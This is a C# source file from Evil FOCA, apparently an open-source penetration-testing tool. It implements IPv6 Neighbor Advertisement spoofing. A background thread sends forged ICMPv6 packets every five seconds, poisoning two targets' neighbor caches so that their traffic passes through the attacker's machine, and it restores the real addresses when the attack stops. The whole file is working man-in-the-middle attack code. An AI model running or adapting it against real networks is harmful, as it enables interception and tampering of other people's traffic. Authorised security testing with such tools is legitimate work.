/* 
Evil FOCA
Copyright (C) 2015 ElevenPaths

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Net.NetworkInformation;
using SharpPcap.WinPcap;
using System.Threading;
using PacketDotNet;
using evilfoca.ICMPv6;
using PacketDotNet.Utils;
using evilfoca.Data;

namespace evilfoca.Attacks
{
    //Clase para realizar el ataque Neighbor Advertisement Spoofing
    public class NASpoofing
    {
        private const int SendPacketEachXSecs = 5;
        private WinPcapDevice device;
        private Thread threadAttack;
        private SynchronizedCollection<Data.Attack> attacks;

        public NASpoofing(WinPcapDevice device, SynchronizedCollection<Data.Attack> attacks)
        {
            this.device = device;
            this.attacks = attacks;
        }

        public void Start()
        {
            threadAttack = new Thread(new ThreadStart(Attack));
            threadAttack.IsBackground = true;
            threadAttack.Start();
        }

        private void Attack()
        {
            while (true)
            {
                try
                {
                    PhysicalAddress MACLocal = device.MacAddress;

                    foreach (Data.Attack attack in attacks.Where(A => A.attackType == Data.AttackType.NeighborAdvertisementSpoofing && A.attackStatus == Data.AttackStatus.Attacking))
                    {
                        if (attack is MitmAttack)
                        {
                            SendNeighborAdvertisement(((MitmAttack)attack).t1.ip, MACLocal, ((MitmAttack)attack).t2.ip, ((MitmAttack)attack).t2.mac);
                            SendNeighborAdvertisement(((MitmAttack)attack).t2.ip, MACLocal, ((MitmAttack)attack).t1.ip, ((MitmAttack)attack).t1.mac);
                        }
                    }

                    foreach (Data.Attack attack in attacks.Where(A => A.attackType == Data.AttackType.NeighborAdvertisementSpoofing && A.attackStatus == Data.AttackStatus.Stopping))
                    {
                        SendNeighborAdvertisement(((MitmAttack)attack).t1.ip, ((MitmAttack)attack).t1.mac, ((MitmAttack)attack).t2.ip, ((MitmAttack)attack).t2.mac);
                        SendNeighborAdvertisement(((MitmAttack)attack).t2.ip, ((MitmAttack)attack).t2.mac, ((MitmAttack)attack).t1.ip, ((MitmAttack)attack).t1.mac);

                        attack.attackStatus = Data.AttackStatus.Stop;
                    }

                    Thread.Sleep(SendPacketEachXSecs * 1000);
                }
                catch (ThreadAbortException)
                {
                    return;
                }
                catch
                {
                }
            }
        }

        static public void SendNeighborAdvertisement(IPAddress ipSrc, PhysicalAddress MACSrc, IPAddress ipDest, PhysicalAddress MACDest)
        {
            Packet p = new EthernetPacket(MACSrc, MACDest, EthernetPacketType.IpV6);
            p.PayloadPacket = new IPv6Packet(ipSrc, ipDest);
            (p.PayloadPacket as IPv6Packet).HopLimit = 255;
            NeighborAdvertisement NA = new NeighborAdvertisement(ipSrc, MACSrc);
            ICMPv6Packet icmp = new ICMPv6Packet(new ByteArraySegment(NA.GetBytes()));
            icmp.Type = (ICMPv6Types)136; //Neighbor Advertisement
            icmp.Code = 0;
            p.PayloadPacket.PayloadPacket = icmp;
            Program.CurrentProject.data.SendPacket(p);
        }

        public void Stop()
        {
            if (threadAttack != null && threadAttack.IsAlive)
            {
                threadAttack.Abort();
                threadAttack = null;
            }
        }

    }
}
